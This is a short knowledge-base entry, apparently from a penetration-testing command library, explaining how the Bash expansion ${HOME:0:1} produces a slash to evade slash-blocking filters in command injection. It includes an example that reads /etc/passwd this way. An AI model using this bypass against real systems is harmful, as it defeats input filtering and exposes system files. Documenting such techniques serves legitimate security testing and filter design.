---
id: 0849e0f3-ce11-416a-bf64-c862614b7f6f
name: echo-home-first-character
type: command
executor: bash
data: 'echo ${HOME:0:1}'
output: null
created_at: '2023-04-06T03:55:57.211968+00:00'
updated_at: '2023-04-06T03:55:57.223113+00:00'
platforms:
  - Linux
tags:
  - command-injection
  - bypass
verified: true
validated: true
---

# echo-home-first-character

## Command

```bash
echo ${HOME:0:1}
```

## Description

This command uses Bash parameter expansion to output the first character of the $HOME environment variable, which is typically / on Unix-like systems. It is used in command injection scenarios to bypass filters that block literal slash characters when constructing file paths.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ${HOME:0:1} | Bash substring expansion: starts at position 0, length 1 of $HOME | Yes |

## Examples

### Basic Usage

```bash
echo ${HOME:0:1}
```

### In Injection Context

Embed in a larger command like `cat ${HOME:0:1}etc${HOME:0:1}passwd` to build paths.

## Expected Output

```
/
```

This confirms the root directory character is accessible without direct input.

## Related

- [[procedures/Linux-Bash-Command-Injection-with-Filter-Bypass]]
